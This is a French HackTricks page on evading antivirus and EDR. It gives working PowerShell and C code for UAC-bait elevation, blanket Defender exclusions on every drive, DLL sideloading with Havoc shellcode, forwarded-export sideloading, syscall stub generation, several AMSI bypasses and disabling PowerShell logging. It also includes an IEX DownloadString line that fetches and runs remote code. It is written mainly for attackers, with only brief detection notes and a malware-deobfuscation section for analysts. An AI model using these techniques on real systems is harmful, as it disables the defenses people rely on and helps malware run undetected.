# Contournement de l’antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite à l’origine par** [**@m2rc_p**](https://twitter.com/m2rc_p)** !**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil qui empêche Windows Defender de fonctionner en simulant un autre antivirus.
- [Désactiver Defender si vous êtes administrateur](basic-powershell-for-pentesters/README.md)

### Appât UAC de type installateur avant toute altération de Defender

Les loaders publics se faisant passer pour des cheats de jeux sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés, qui **demandent d’abord à l’utilisateur une élévation de privilèges**, puis neutralisent Defender. Le processus est simple :

1. Vérifier si le contexte est administratif avec `net session`. La commande ne réussit que si l’appelant dispose de droits d’administrateur ; un échec indique donc que le loader s’exécute en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher l’invite UAC de consentement attendue, tout en conservant la ligne de commande d’origine.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Les victimes pensent déjà installer un logiciel « cracké », elles acceptent donc généralement l’invite, ce qui donne au malware les droits nécessaires pour modifier la stratégie de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` globales pour chaque lettre de lecteur

Une fois les privilèges élevés, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver directement le service. Le loader commence par arrêter le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible échappe à l’analyse :

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observations clés :

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.), donc **tout futur payload déposé n’importe où sur le disque sera ignoré**.
- L’exclusion de l’extension `.sys` est préventive : les attaquants se réservent ainsi la possibilité de charger ultérieurement des drivers non signés sans avoir à toucher de nouveau à Defender.
- Toutes les modifications sont effectuées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes suivantes de confirmer que les exclusions sont toujours présentes ou de les étendre sans déclencher de nouveau l’UAC.

Comme aucun service Defender n’est arrêté, les contrôles de santé basiques continuent d’indiquer que « l’antivirus est actif », même si l’inspection en temps réel ne touche jamais ces chemins.<sup>[[26]](#references)</sup>

## **Méthodologie d’évasion de l’AV**

Actuellement, les AV utilisent différentes méthodes pour déterminer si un fichier est malveillant : la détection statique, l’analyse dynamique et, pour les EDR les plus avancés, l’analyse comportementale.

### **Détection statique**

La détection statique consiste à repérer des chaînes ou des tableaux d’octets malveillants connus dans un binaire ou un script, ainsi qu’à extraire des informations du fichier lui-même (par exemple, sa description, le nom de l’entreprise, les signatures numériques, l’icône, la somme de contrôle, etc.). Cela signifie que l’utilisation d’outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais vous aurez besoin d’un loader pour le déchiffrer et l’exécuter en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou votre script pour qu’il échappe à l’AV, mais cela peut prendre beaucoup de temps selon ce que vous essayez d’obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, il n’y aura pas de signatures malveillantes connues, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Pour vérifier si Windows Defender détecte votre fichier par détection statique, [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) est un bon outil. Il divise le fichier en plusieurs segments, puis demande à Defender d’analyser chacun d’eux individuellement. Il peut ainsi vous indiquer précisément quelles chaînes ou quels octets de votre binaire sont signalés.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l’AV Evasion pratique.

### **Analyse dynamique**

L’analyse dynamique consiste à faire exécuter votre binaire dans une sandbox par l’AV, qui surveille ensuite toute activité malveillante (par exemple, essayer de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques moyens d’échapper aux sandboxes.

- **Attendre avant l’exécution** Selon la façon dont cette méthode est implémentée, elle peut être très efficace pour contourner l’analyse dynamique de l’AV. Les AV disposent de très peu de temps pour analyser les fichiers sans interrompre le travail de l’utilisateur ; de longues pauses peuvent donc perturber l’analyse des binaires. Le problème est que de nombreuses sandboxes d’AV peuvent simplement ignorer la pause, selon la façon dont elle est implémentée.
- **Vérifier les ressources de la machine** Les sandboxes disposent généralement de très peu de ressources (par exemple, moins de 2 Go de RAM), faute de quoi elles pourraient ralentir la machine de l’utilisateur. Vous pouvez aussi faire preuve de créativité : vérifiez, par exemple, la température du CPU ou même la vitesse des ventilateurs ; tous ces éléments ne seront pas simulés dans la sandbox.
- **Vérifications spécifiques à la machine** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l’ordinateur pour voir s’il correspond à celui que vous avez spécifié. Dans le cas contraire, vous pouvez faire quitter votre programme.

Il s’avère que le nom de l’ordinateur de la sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l’ordinateur dans votre malware avant sa détonation : s’il correspond à HAL9TH, cela signifie que vous êtes dans la sandbox de Defender et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour échapper aux sandboxes :

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Comme nous l’avons déjà dit dans cet article, les **outils publics** finiront par **être détectés**. Vous devriez donc vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui permet lui aussi de dumper LSASS ?

La seconde option est probablement la bonne. Prenons mimikatz : c’est probablement l’un des malwares les plus signalés par les AV et les EDR, voire le plus signalé. Le projet lui-même est excellent, mais il est aussi particulièrement difficile à utiliser pour contourner les AV. Cherchez donc simplement des alternatives pour atteindre votre objectif.

> [!TIP]
> Lorsque vous modifiez vos payloads pour échapper à la détection, veillez à **désactiver l’envoi automatique d’échantillons** dans Defender et, s’il vous plaît, **NE TÉLÉVERSEZ PAS SUR VIRUSTOTAL** si votre objectif est d’échapper à la détection sur le long terme. Si vous voulez vérifier si un AV particulier détecte votre payload, installez-le sur une VM, essayez de désactiver l’envoi automatique d’échantillons et testez-le jusqu’à obtenir le résultat souhaité.

## EXEs vs DLLs

Dans la mesure du possible, **privilégiez toujours les DLL pour l’évasion**. D’après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés. C’est donc une astuce très simple pour éviter la détection dans certains cas (si votre payload peut être exécuté sous forme de DLL, bien sûr).

Comme on peut le voir sur cette image, un payload DLL de Havoc obtient un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE obtient un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Comparaison sur antiscan.me d’un payload EXE Havoc classique et d’une DLL Havoc classique</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces permettant d’utiliser des fichiers DLL de manière beaucoup plus furtive.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant côte à côte l’application victime et le ou les payloads malveillants.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading avec [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Cette commande affichera la liste des programmes susceptibles au DLL hijacking dans "C:\Program Files\\" ainsi que les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement **d’explorer vous-même les programmes vulnérables au DLL Hijack/Sideload**, cette technique est assez furtive lorsqu’elle est correctement mise en œuvre, mais si vous utilisez des programmes DLL Sideloadable connus du public, vous risquez facilement de vous faire repérer.

Le simple fait de placer une DLL malveillante portant le nom de celle qu’un programme s’attend à charger ne suffit pas à charger votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous allons utiliser une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige vers la DLL d’origine les appels qu’un programme effectue depuis la DLL proxy (et malveillante), préservant ainsi le fonctionnement du programme tout en permettant l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Voici les étapes que j’ai suivies :

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

La dernière commande nous fournira 2 fichiers : un modèle de code source de DLL et la DLL d’origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J’appellerais ça une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que [la vidéo d’ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour en apprendre davantage sur ce dont nous avons parlé.

### Abusing Forwarded Exports (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l’entrée d’exportation contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu’un appelant résout l’exportation, le chargeur Windows va :

- Charger `TargetDll` si elle ne l’est pas déjà
- Résoudre `TargetFunc` à partir de celle-ci

Comportements importants à comprendre :
- Si `TargetDll` est une KnownDLL, elle est fournie depuis l’espace de noms KnownDLLs protégé (par exemple, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n’est pas une KnownDLL, l’ordre de recherche normal des DLL est utilisé, y compris le répertoire du module qui effectue la résolution du forwarder.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction redirigée vers un nom de module non-KnownDLL, puis placer cette DLL signée dans le même répertoire qu’une DLL contrôlée par l’attaquant et portant exactement le nom du module cible redirigé. Lorsque le forwarder est invoqué, le chargeur résout la redirection et charge votre DLL depuis le même répertoire, exécutant ainsi votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sur Windows 11 :

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` n’est pas une KnownDLL : elle est donc résolue selon l’ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un `DllMain` minimal suffit pour exécuter du code ; vous n’avez pas besoin d’implémenter la fonction transférée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n’est pas implémenté, vous obtiendrez une erreur « missing API » seulement après l’exécution de `DllMain`

Conseils de recherche :
- Concentrez-vous sur les exports forwardés dont le module cible n’est pas un KnownDLL. Les KnownDLLs sont répertoriés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (par exemple, rundll32.exe) qui chargent des DLL signées depuis des chemins non système, puis des DLL qui ne sont pas des KnownDLLs et qui portent le même nom de base depuis ce répertoire
- Déclenchez une alerte sur les chaînes processus/modules telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par les utilisateurs
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez les droits d’écriture et d’exécution dans les répertoires des applications

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain. Ne vous fiez donc jamais à un seul outil et, si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## Syscalls directs/indirects et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **hooks inline en mode utilisateur** sur les stubs syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et passent en mode noyau sans exécuter le point d'entrée exporté hooké.<sup>[[32]](#references)</sup>

**Options d'appel :**
- **Direct (embarqué)** : émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à un export de `ntdll`).
- **Indirect** : sauter vers un gadget `syscall` existant dans `ntdll` afin que la transition vers le noyau semble provenir de `ntdll` (utile pour l'évasion heuristique) ; **randomized indirect** choisit un gadget dans un pool pour chaque appel.
- **Egg-hunt** : éviter d'embarquer sur le disque la séquence d'opcodes statique `0F 05` ; résoudre une séquence syscall à l'exécution.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (VA sort)** : déduire les SSN en triant les stubs syscall par adresse virtuelle plutôt qu'en lisant les octets des stubs.
- **SyscallsFromDisk** : mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN dans son `.text`, puis le démonter (contourne tous les hooks en mémoire).
- **RecycledGate** : combiner la déduction des SSN par tri des VA avec la validation des opcodes lorsqu'un stub est propre ; en cas de hook, revenir à la déduction par VA.
- **HW Breakpoint** : placer DR0 sur l'instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l'exécution, sans analyser les octets hookés.

Exemple d'utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les « [malwares sans fichier](https://en.wikipedia.org/wiki/Fileless_malware) ». Au départ, les antivirus ne pouvaient analyser que les **fichiers sur le disque**. Ainsi, si vous pouviez exécuter des payloads **directement en mémoire**, l’antivirus ne pouvait rien faire pour l’empêcher, car il n’avait pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée aux composants Windows suivants :

- Contrôle de compte d’utilisateur, ou UAC (élévation de privilèges pour les EXE, COM, MSI ou installations ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA d’Office

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois non chiffrée et non obfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` déclenchera l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez le préfixe `amsi:`, suivi du chemin de l’exécutable à partir duquel le script a été exécuté, ici powershell.exe.

Nous n’avons déposé aucun fichier sur le disque, mais nous avons quand même été détectés en mémoire grâce à AMSI.

De plus, depuis **.NET 4.8**, le code C# est lui aussi analysé par AMSI. Cela concerne même `Assembly.Load(byte[])`, utilisé pour charger du code exécuté en mémoire. C’est pourquoi il est recommandé d’utiliser des versions antérieures de .NET (comme 4.7.2 ou une version antérieure) pour l’exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne façon d’échapper à la détection.

Cependant, AMSI peut désobfusquer les scripts, même s’ils comportent plusieurs couches d’obfuscation. Selon la méthode utilisée, l’obfuscation peut donc être une mauvaise option. Le contournement n’est pas si simple. Parfois, il suffit de modifier quelques noms de variables, mais tout dépend du degré de détection de l’élément.

- **AMSI Bypass**

AMSI étant implémenté par le chargement d’une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est facile de la modifier, même avec un utilisateur non privilégié. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont découvert plusieurs moyens de contourner l’analyse d’AMSI.

**Provoquer une erreur**

Faire échouer l’initialisation d’AMSI (`amsiInitFailed`) empêchera toute analyse dans le processus en cours. Cette technique a été initialement révélée par [Matt Graeber](https://twitter.com/mattifestation), puis Microsoft a développé une signature pour en empêcher l’utilisation à grande échelle.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Il a suffi d’une seule ligne de code PowerShell pour rendre AMSI inutilisable dans le processus PowerShell en cours. Cette ligne a bien sûr été détectée par AMSI elle-même ; il faut donc la modifier pour utiliser cette technique.

Voici un contournement d’AMSI modifié que j’ai trouvé dans ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Gardez à l’esprit que cette publication sera probablement signalée dès sa parution ; vous ne devriez donc publier aucun code si votre objectif est de passer inaperçu.

**Memory Patching**

Cette technique a été découverte initialement par [@RastaMouse](https://twitter.com/_RastaMouse/). Elle consiste à trouver l’adresse de la fonction « AmsiScanBuffer » dans amsi.dll (chargée d’analyser les entrées fournies par l’utilisateur) et à la remplacer par des instructions qui renvoient le code E_INVALIDARG. Ainsi, le résultat de l’analyse réelle renvoie 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

De nombreuses autres techniques permettent également de contourner AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement d’amsi.dll (hook LdrLoadDll)

AMSI n’est initialisé qu’après le chargement d’`amsi.dll` dans le processus actuel. Un bypass robuste et indépendant du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll`, qui renvoie une erreur lorsque le module demandé est `amsi.dll`. AMSI n’est alors jamais chargé et aucune analyse n’a lieu pour ce processus.<sup>[[23]](#references)</sup>

Présentation de l’implémentation (pseudocode C/C++ x64) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Fonctionne avec PowerShell, WScript/CScript et les chargeurs personnalisés (tout ce qui chargerait autrement AMSI).
- À combiner avec l’envoi des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande trop longs.
- Utilisé par des chargeurs exécutés via des LOLBins (par exemple, `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour contourner AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également des scripts pour contourner AMSI et éviter les signatures grâce à des fonctions définies par l’utilisateur et randomisées, des variables et des expressions de caractères, et applique une casse aléatoire aux mots-clés PowerShell afin d’éviter les signatures.

**Supprimer la signature détectée**

Vous pouvez utiliser des outils tels que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer de la mémoire du processus en cours la signature AMSI détectée. Ces outils analysent la mémoire du processus en cours à la recherche de la signature AMSI, puis la remplacent par des instructions NOP, la supprimant ainsi de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pouvez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment faire :

```bash
powershell.exe -version 2
```

## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui permet d’enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d’audit et de dépannage, mais peut aussi poser un **problème aux attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver la transcription PowerShell et la journalisation des modules** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé. Vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment faire : `powershell.exe -version 2`
- **Utiliser une session PowerShell non gérée** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l’approche utilisée par le `powerpick` de Cobalt Strike). Cela permet d’échapper aux contrôles spécifiquement associés au processus `powershell.exe`, mais ne désactive pas en soi AMSI, la journalisation des blocs de script ni toutes les autres défenses PowerShell ; la couverture dépend du runtime et de l’implémentation de l’hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmente l’entropie du binaire et facilite sa détection par les AV et les EDR. Soyez prudent et envisagez de n’appliquer le chiffrement qu’à certaines parties de votre code qui sont sensibles ou doivent être dissimulées.

### Désobfuscation de binaires .NET protégés par ConfuserEx

Lors de l’analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le workflow ci-dessous **restaure de manière fiable un IL presque identique à l’original**, qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de l’anti-altération – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE, de sorte que toute modification provoque le plantage du binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`), qui peuvent être utiles pour créer votre propre unpacker.

2.  Récupération des symboles et du flux de contrôle – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Options :
     • `-p crx` – sélectionner le profil ConfuserEx 2
     • de4dot annulera le *control-flow flattening*, restaurera les espaces de noms, les classes et les noms de variables d’origine, et déchiffrera les chaînes constantes.

3.  Suppression des proxy calls – ConfuserEx remplace les appels directs de méthode par des wrappers légers (également appelés *proxy calls*) afin de compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Après cette étape, vous devriez voir des API .NET classiques comme `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu dans dnSpy, puis recherchez de grands blocs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *véritable* payload. Souvent, le malware le stocke sous forme de tableau d’octets encodé en TLV, initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus rétablit le flux d’exécution **sans** avoir besoin d’exécuter l’échantillon malveillant – utile sur un poste de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute`, qui peut servir d’IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L’objectif de ce projet est de fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d’améliorer la sécurité des logiciels grâce à l’[obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les altérations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, lors de la compilation, du code obfusqué sans outil externe ni modification du compilateur.
